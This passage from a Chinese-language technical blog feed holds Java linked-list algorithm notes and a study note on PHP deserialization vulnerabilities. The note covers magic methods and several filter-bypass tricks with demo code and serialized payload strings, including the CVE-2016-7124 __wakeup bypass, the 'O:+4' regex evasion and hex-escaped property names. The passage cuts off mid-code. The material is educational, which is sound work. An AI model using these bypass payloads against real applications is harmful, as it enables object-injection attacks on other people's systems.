class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curA</span> <span class="operator">=</span> headA;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curB</span> <span class="operator">=</span> headB;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lenA</span> <span class="operator">=</span> <span class="number">0</span>, lenB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(curA != <span class="literal">null</span>)&#123;</span><br><span class="line">            lenA++;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(curB != <span class="literal">null</span>)&#123;</span><br><span class="line">            lenB++;</span><br><span class="line">            curB = curB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        curA = headA;</span><br><span class="line">        curB = headB;</span><br><span class="line">        <span class="keyword">if</span>(lenB &gt; lenA)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmpLen</span> <span class="operator">=</span> lenA;</span><br><span class="line">            lenA = lenB;</span><br><span class="line">            lenB = tmpLen;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmpNode</span> <span class="operator">=</span> curA;</span><br><span class="line">            curA = curB;</span><br><span class="line">            curB = tmpNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 求长度差</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> lenA - lenB;</span><br><span class="line">        <span class="comment">// 让curA和curB在同一起点上</span></span><br><span class="line">        <span class="keyword">while</span>(gap-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(curA != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(curA == curB)&#123;</span><br><span class="line">                <span class="keyword">return</span> curA;</span><br><span class="line">            &#125;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">            curB = curB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的版本是同步走的版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//合并链表同步移动</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">       <span class="comment">// p1指向A链表头节点，p2指向B链表头节点</span></span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> headA, p2 = headB;</span><br><span class="line">       <span class="keyword">while</span>(p1 != p2)&#123;</span><br><span class="line">        <span class="comment">// p1走一步，如果走到A链表末尾，转到B链表</span></span><br><span class="line">        <span class="keyword">if</span>(p1 == <span class="literal">null</span>) p1 = headB;</span><br><span class="line">        <span class="keyword">else</span> p1 = p1.next;</span><br><span class="line">        <span class="comment">// p2走一步，如果走到B链表末尾，转到A链表</span></span><br><span class="line">        <span class="keyword">if</span>(p2 == <span class="literal">null</span>) p2 = headA;</span><br><span class="line">        <span class="keyword">else</span> p2 = p2.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="142-环形链表II"><a href="#142-环形链表II" class="headerlink" title="142.环形链表II"></a>142.环形链表II</h2><p>判断链表是否有环<br>可以使用快慢指针法，分别定义 fast 和 slow 指针，从头结点出发，fast指针每次移动两个节点，slow指针每次移动一个节点，如果 fast 和 slow指针在途中相遇 ，说明这个链表有环。<br>为什么fast 走两个节点，slow走一个节点，有环的话，一定会在环内相遇呢，而不是永远的错开呢<br>首先第一点：fast指针一定先进入环中，如果fast指针和slow指针相遇的话，一定是在环中相遇，这是毋庸置疑的。<br>那么来看一下，为什么fast指针和slow指针一定会相遇呢？<br>可以画一个环，然后让 fast指针在任意一个节点开始追赶slow指针。这是因为fast是走两步，slow是走一步，其实相对于slow来说，fast是一个节点一个节点的靠近slow的，所以fast一定可以和slow重合。</p><p>如果有环，如何找到这个环的入口<br>此时已经可以判断链表是否有环了，那么接下来要找这个环的入口了。<br>假设从头结点到环形入口节点 的节点数为x。 环形入口节点到 fast指针与slow指针相遇节点 节点数为y。 从相遇节点 再到环形入口节点节点数为 z。<br>那么相遇时： slow指针走过的节点数为: x + y， fast指针走过的节点数：x + y + n (y + z)，n为fast指针在环内走了n圈才遇到slow指针， （y+z）为 一圈内节点的个数A。<br><img src="/2024/09/11/algorithm/List/image-2.png"><br>因为fast指针是一步走两个节点，slow指针一步走一个节点， 所以 fast指针走过的节点数 &#x3D; slow指针走过的节点数 * 2：<br>(x + y) * 2 &#x3D; x + y + n (y + z)<br>两边消掉一个（x+y）: x + y &#x3D; n (y + z)<br>因为要找环形的入口，那么要求的是x，因为x表示 头结点到 环形入口节点的的距离。<br>所以要求x ，将x单独放在左面：x &#x3D; n (y + z) - y ,<br>再从n(y+z)中提出一个 （y+z）来，整理公式之后为如下公式：x &#x3D; (n - 1) (y + z) + z 注意这里n一定是大于等于1的，因为 fast指针至少要多走一圈才能相遇slow指针。<br>这个公式说明什么呢？<br>先拿n为1的情况来举例，意味着fast指针在环形里转了一圈之后，就遇到了 slow指针了。<br>当 n为1的时候，公式就化解为 x &#x3D; z，<br>这就意味着，从头结点出发一个指针，从相遇节点 也出发一个指针，这两个指针每次只走一个节点， 那么当这两个指针相遇的时候就是 环形入口的节点。<br>也就是在相遇节点处，定义一个指针index1，在头结点处定一个指针index2。<br>让index1和index2同时移动，每次移动一个节点， 那么他们相遇的地方就是 环形入口的节点。</p><p>那么 n如果大于1是什么情况呢，就是fast指针在环形转n圈之后才遇到 slow指针。<br>其实这种情况和n为1的时候 效果是一样的，一样可以通过这个方法找到 环形的入口节点，只不过，index1 指针在环里 多转了(n-1)圈，然后再遇到index2，相遇点依然是环形的入口节点。</p><p>在推理过程中，大家可能有一个疑问就是：为什么第一次在环中相遇，slow的 步数 是 x+y 而不是 x + 若干环的长度 + y 呢？<br>首先slow进环的时候，fast一定是先进环来了。<br>如果slow进环入口，fast也在环入口，那么把这个环展开成直线，就是如下图的样子：<br><img src="/2024/09/11/algorithm/List/image-3.png"><br>可以看出如果slow 和 fast同时在环入口开始走，一定会在环入口3相遇，slow走了一圈，fast走了两圈。<br>重点来了，slow进环的时候，fast一定是在环的任意一个位置，如图：<br><img src="/2024/09/11/algorithm/List/image-4.png"><br>那么fast指针走到环入口3的时候，已经走了k + n 个节点，slow相应的应该走了(k + n) &#x2F; 2 个节点。<br>因为k是小于n的（图中可以看出），所以(k + n) &#x2F; 2 一定小于n。<br>也就是说slow一定没有走到环入口3，而fast已经到环入口3了。<br>这说明什么呢？<br>在slow开始走的那一环已经和fast相遇了。<br>那有同学又说了，为什么fast不能跳过去呢？ 在刚刚已经说过一次了，fast相对于slow是一次移动一个节点，所以不可能跳过去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            <span class="keyword">if</span>(slow == fast)&#123;</span><br><span class="line">                <span class="type">ListNode</span> <span class="variable">index1</span> <span class="operator">=</span> fast;</span><br><span class="line">                <span class="type">ListNode</span> <span class="variable">index2</span> <span class="operator">=</span> head;</span><br><span class="line">                <span class="keyword">while</span>(index1 != index2)&#123;</span><br><span class="line">                    index1 = index1.next;</span><br><span class="line">                    index2 = index2.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> index1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用哈希表实现 非常直观的思路是：我们遍历链表中的每个节点，并将它记录下来；一旦遇到了此前遍历过的节点，就可以判定链表中存在环。时间空间复杂度都是O(N)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pos</span> <span class="operator">=</span> head;</span><br><span class="line">        Set&lt;ListNode&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;ListNode&gt;();</span><br><span class="line">        <span class="keyword">while</span>(pos != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited.contains(pos))&#123;</span><br><span class="line">                <span class="keyword">return</span> pos;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                visited.add(pos);</span><br><span class="line">            &#125;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/algorithm/List/image-5.png"></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第一部分 PHP反序列化分析</title>
      <link href="/2024/09/10/WebSecurity/owasptop/deserialization/"/>
      <url>/2024/09/10/WebSecurity/owasptop/deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是序列化和反序列化？"><a href="#什么是序列化和反序列化？" class="headerlink" title="什么是序列化和反序列化？"></a>什么是序列化和反序列化？</h1><p>我个人的理解是：序列化是将对象转换为字节流，反序列化是将字节流转换为对象。为什么会有这些概念呢？还是来源于具体的需求，举个例子来说，比如一个公司要开发一个软件，这个软件需要保存用户的信息，那么这个信息需要持久化存储，那么这个信息怎么存储呢，这些信息可能是个在程序运行时可能是个对象，经过序列化之后，就可以存储到文件中，那么反序列化就是将存储在文件中的对象，恢复成对象，这样就可以解决对象的持久化存储的问题。</p><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><p>不管是什么语言的序列化，从概念需求出发，就可以决定出场景：数据存储、网络传输、通过特定协议读取。</p><h2 id="为什么反序列化会出现漏洞？"><a href="#为什么反序列化会出现漏洞？" class="headerlink" title="为什么反序列化会出现漏洞？"></a>为什么反序列化会出现漏洞？</h2><p>从根本原因来看，我个人感觉还是来自输入数据校验不完整，反序列化漏洞的存在应当归咎于开发者（有时候在想一些漏洞成因时，我总是想要确定下应当是谁负责任……），开发者开发应用时应当假设所有用户都是不可信的，对于所有用可能接触到的输入点都需要格外注意。就反序列化来说，一旦输入数据没有经过校验，那么反序列化的对象就可能会被恶意用户定制化，进而执行恶意代码。</p><h2 id="漏洞利用的关键"><a href="#漏洞利用的关键" class="headerlink" title="漏洞利用的关键"></a>漏洞利用的关键</h2><p>黑盒：判断出存在有序列化的数据，序列化的接口，观察恢复元数据，利用原生类构造调用链，验证是否存在<br>白盒：定位关键函数，观察序列化输入是否可控</p><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p>在PHP中，序列化和反序列化是将对象转换为可以存储或传输的字符串表示形式的过程，以及将这种字符串表示形式恢复为对象的过程。魔术方法（magic methods）是PHP中一些以双下划线开始的方法，它们在某些操作发生时自动被调用，例如对象的创建、销毁、调用不存在的方法等。序列化和反序列化的函数是使用<code>unserialize()</code>和<code>serialize()</code>函数，其实感觉没什么讨论的，重点先讨论下魔术方法。</p><h2 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h2><p>以下内容参考自：<a href="https://segmentfault.com/a/1190000007250604">PHP之十六个魔术方法详解</a></p><ul><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ul><p>其中，__toString()用的比较多，它的触发场景可以总结为下面这些：</p><ul><li>echo($obj)&#x2F;print($obj)打印时会触发 </li><li>反序列化对象与字符串连接时 </li><li>反序列化对象参与格式化字符串时 </li><li>反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型） </li><li>反序列化对象参与格式化SQL语句，绑定参数时 </li><li>反序列化对象在经过php字符串处理函数，如strlen()、strops()、strcmp()、addslashes()等 </li><li>在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用 </li><li>反序列化的对象作为class_exists()的参数的时候</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<br><code>__construct()</code> -&gt;<code>__sleep()</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code><br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image.png" alt="Alt text"></p><p>图中显示的是很经典的图，展示了对象序列化后的内容，其中：</p><ul><li>a - array 数组型</li><li>b - boolean 布尔型</li><li>d - double 浮点型</li><li>i - integer 整数型</li><li>o - common object 共同对象</li><li>r - objec reference 对象引用</li><li>s - non-escaped binary string 非转义的二进制字符串</li><li>S - escaped binary string 转义的二进制字符串</li><li>C - custom object 自定义对象</li><li>O - class 对象</li><li>N - null 空</li><li>R - pointer reference 指针引用</li><li>U - unicode string Unicode 编码的字符串</li></ul><p>PHP序列化需注意以下几点：</p><ol><li>只序列化属性：PHP的序列化机制默认只序列化对象的公共（public）和受保护（protected）属性。私有（private）属性不会被序列化，除非在类的 __sleep() 魔术方法中明确指定。</li><li>类定义必须可用：反序列化对象时，必须确保定义该对象的类在当前作用域中可用。如果类定义不存在，反序列化将失败，并且可能产生警告或错误。</li><li>控制属性：攻击者如果能够控制序列化数据中的属性值，可能会尝试利用这些属性来触发类的其他方法或执行不安全的操作。</li></ol><h2 id="PHP反序列化绕过技巧"><a href="#PHP反序列化绕过技巧" class="headerlink" title="PHP反序列化绕过技巧"></a>PHP反序列化绕过技巧</h2><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">源自这里</a></p><h3 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h3><p>在序列化的数据中，如果类的属性是protect，则结果会在变量名前加上<code>\x00*\x00</code>(所以在fuzzing时需要注意用urlencode处理，不然直接输出显示会丢掉这些字符)<br>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>，也会正常输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="绕过__wakeup(CVE-2016-7124)"></a>绕过__wakeup(CVE-2016-7124)</h3><p>版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>, 输出结果为 666<br>而把对象属性个数的值增大执行 <code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>，则会输出abc</p><h3 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><ul><li>利用加号绕过（注意在url里传参时+要编码为%2B）</li><li>serialize(array(a));为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面例子中将$a赋值给$b，然后反序列化$a，由于$b是引用关系，所以反序列化后$b也会被赋值为abc，所以反序列化后输出666</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br></pre></td></tr></table></figure><p>博主写了个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 